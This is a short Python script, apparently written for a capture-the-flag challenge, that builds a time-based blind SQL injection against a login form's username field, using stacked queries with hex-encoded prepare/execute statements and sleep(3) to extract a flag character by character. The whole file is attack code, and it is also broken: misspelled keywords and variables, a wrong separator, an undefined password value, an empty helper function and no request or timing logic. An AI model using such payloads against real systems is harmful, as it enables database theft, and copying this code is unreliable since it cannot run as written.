import requests
import time
import json
def main():
    url='url'
    payload="123';set @a=0x{0};prepare ctf from @a;excute ctf -- -"
    result=''
    for i in range(1,30):
        payloads="select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)"
        for j in range(0,128):
            data={'username':payload.format(str_to_hex(paylaods.format(i.j))),'password':asd123}
            

def str_to_hex():

if __name__=='__main__':
    main()